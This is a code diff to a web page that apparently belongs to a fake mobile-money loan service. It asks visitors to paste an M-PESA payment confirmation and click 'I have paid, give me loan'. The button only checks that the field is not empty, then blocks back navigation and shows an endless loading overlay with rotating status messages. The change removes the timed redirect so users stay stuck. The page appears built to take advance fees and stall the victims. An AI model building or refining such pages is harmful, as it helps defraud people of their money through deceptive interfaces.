@@ -306,13 +306,13 @@
       <div class="mpesa-card">
         <i class="fas fa-check-circle" style="color: #2b7a4b; font-size: 1.6rem; margin-bottom: 8px; display: block;"></i>
         
-        <!-- Empty textarea for user to paste M-PESA message -->
-        <textarea id="mpesaPasteArea" class="message-area" placeholder="✧ paste your M-PESA confirmation here ✧"></textarea>
+        <!-- Empty textarea for user to paste M-PESA message (completely blank placeholder) -->
+        <textarea id="mpesaPasteArea" class="message-area" placeholder=""></textarea>
         
-        <!-- The instruction line has been removed -->
+        <!-- No instruction line or copy button -->
       </div>
 
-      <!-- English button text - triggers validation + overlay + redirect after 10s -->
+      <!-- English button text - triggers validation then continuous overlay (no redirect) -->
       <button class="btn-primary" id="verifyPaymentBtn"><i class="fas fa-thumbs-up"></i> I have paid, give me loan</button>
       
       <button class="btn-outline" id="backToDashboardBtn"><i class="fas fa-arrow-left"></i> back to dashboard</button>
@@ -375,7 +375,7 @@
         }, 1500);
       }
 
-      // Main button: validates message, then activates continuous overlay + redirect after 10s
+      // Main button: validates message, then activates continuous overlay (no redirect)
       document.getElementById('verifyPaymentBtn').addEventListener('click', function() {
         const pasted = document.getElementById('mpesaPasteArea').value.trim();
         if (!pasted) {
@@ -401,7 +401,7 @@
         // Start blocking back navigation
         enableBackBlocker();
 
-        // Rotate status messages while loading
+        // Rotate status messages while loading (continuous)
         let counter = 0;
         const subEl = document.querySelector('.loading-sub');
         const intervalMsg = setInterval(() => {
@@ -419,13 +419,7 @@
           }
         }, 3500);
 
-        // ---- REDIRECT AFTER 10 SECONDS ----
-        setTimeout(() => {
-          // Only redirect if overlay is still active (i.e., not manually removed)
-          if (loadingOverlay.classList.contains('active')) {
-            window.location.href = 'dashboard.html';
-          }
-        }, 10000); // 10 seconds
+        // No redirect – overlay stays indefinitely
       });
 
       // Back to dashboard button – only works if overlay is NOT active
